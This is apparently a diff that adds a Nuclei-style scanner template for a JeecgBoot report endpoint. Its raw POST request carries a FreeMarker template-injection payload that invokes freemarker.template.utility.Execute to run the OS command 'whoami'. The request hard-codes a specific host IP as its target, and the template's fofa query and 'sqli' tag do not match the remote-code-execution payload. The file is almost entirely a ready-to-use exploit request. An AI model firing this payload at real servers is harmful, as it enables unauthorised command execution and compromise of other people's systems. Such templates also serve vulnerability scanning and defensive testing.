@@ -1,0 +1,35 @@
+id: jeecgboot-queryFieldBySql-sqli-rce
+info:
+  name: jeecgboot-queryFieldBySql-sqli-rce
+  author: sb
+  severity: critical
+  tags: sqli
+  metadata:
+    fofa-query: title="index" && header="lighttpd/1.4.30"
+variables:
+  s1: '{{rand_base(5, "56789")}}'
+  str: '{{rand_base(4)}}'
+  rand: '{{rand_base(3)}}'
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: 111.53.104.81:92
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Length: 107
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        
+        {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"{{rce}} \") }' "}
+        
+           
+    payloads:
+      rce:
+        - "whoami"  
+    req-condition: true    
+    matchers-condition: and             
+    matchers:     
+      - type: dsl
+        dsl:
+          - 'contains(body,"解析成功")'
+        
